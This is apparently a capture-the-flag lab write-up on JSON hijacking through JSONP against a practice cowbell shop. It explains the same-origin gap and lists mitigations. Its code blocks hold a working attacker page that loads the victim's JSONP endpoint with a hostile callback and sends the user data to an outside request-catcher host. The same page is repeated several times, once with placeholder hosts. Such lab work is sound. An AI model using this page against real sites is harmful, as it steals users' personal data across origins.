# JSON Hijacking Attack with JSONP

## Challenge

This challenge is about JSON \(JSONP\) hijacking. By doing such an attack you should understand the theory.

## Answer

### Explain the security problem 

* **JSONP** = JavaScript Object Notation with **Padding**
* Technique used to circumvent the Same-Origin Policy when transferring data with AJAX across

  different domains

* Browsers do not enforce SOP on the HTML &lt;script&gt; tag
* Padding refers to characters around the JSON payload, e.g.
  * `callback({employees: [{“firstName”: “John”, “lastName”: “Doe”}, ...]})`



### Explain your attack. \(exploit, screenshot, hacking journal\) 

Step 1\) Use old cowbell shop, buy some bells

![](../../.gitbook/assets/image%20%28366%29.png)

Step 2\) Use Theia Web IDE and change the change\_me.html to the following:

{% code title="change\_me.html" %}
```markup
<html>
<head>
<script>
var target="https://41961063-5823-447b-86c0-42221f35dfe6.idocker.vuln.land/drop?";


function invoke(obj) {
var ref = obj;
   var inner = function() {
      var response = "";

      for(var x in ref ) {
         response += ref[x] + ", ";
      }

      new Image().src=target + escape(response);    
   };
   setTimeout(inner, 100);
}

</script>
<script src="https://glocken.vm.vuln.land/12001/json_case0/json0/controller?action=getuser&func=invoke">
</script>
</head>
<body>
</body>
</html>
<html>
<head>
<script>
var target="https://41961063-5823-447b-86c0-42221f35dfe6.idocker.vuln.land/drop?";


function invoke(obj) {
var ref = obj;
   var inner = function() {
      var response = "";

      for(var x in ref ) {
         response += ref[x] + ", ";
      }

      new Image().src=target + escape(response);    
   };
   setTimeout(inner, 100);
}

</script>
<script src="https://glocken.vm.vuln.land//12001/json_case0/json0/controller?action=getuser&func=invoke">
</script>
</head>
<body>
</body>
</html>

```
{% endcode %}



Step 3\) Send attacker URL to the victim

![](../../.gitbook/assets/image%20%28379%29.png)

Step 4\) 

![](../../.gitbook/assets/image%20%28373%29.png)

Step 5\) 

```markup
<html>
<head>
<script>
var target="https://REQUEST_CATCHER_FQDN/drop?";


function invoke(obj) {
var ref = obj;
   var inner = function() {
      var response = "";

      for(var x in ref ) {
         response += ref[x] + ", ";
      }

      new Image().src=target + escape(response);    
   };
   setTimeout(inner, 100);
}

</script>
<script src="{VULNERABLE COWBELL SHOP}/12001/json_case0/json0/controller?action=getuser&func=invoke">
</script>
</head>
<body>
</body>
</html>
```

The attacker is defining the `invoke` method before `script src` an URL from the cowbell shop. The json data returned by the cowbell shop are jsonp - json with padding. This makes the hacker happy - as he can now exfiltrate the json data via his own `invoke` implementation.

### Explain mitigation \(remedy\)

* Use Anti XSRF-Tokens
* Begin the JSON-Response with an infinite loop:
* DO NOT USE JSONP!



